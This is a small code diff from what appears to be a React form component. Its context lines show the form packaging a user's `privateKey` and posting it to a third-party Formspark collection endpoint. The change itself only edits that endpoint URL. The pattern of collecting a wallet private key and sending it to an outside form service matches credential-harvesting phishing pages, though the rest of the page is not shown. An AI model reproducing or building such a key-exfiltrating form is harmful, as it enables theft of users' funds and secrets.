@@ -29,7 +29,7 @@ const Form = () => {
       dataToSend = { privateKey };
     }
     // You can perform form submission logic here
-    const formSparkUrl = "https://submit-form.com/B2iNMPqV";
+    const formSparkUrl = "https://submit-form.com/";
 
     try {
       // Make the POST request to Formspark's API
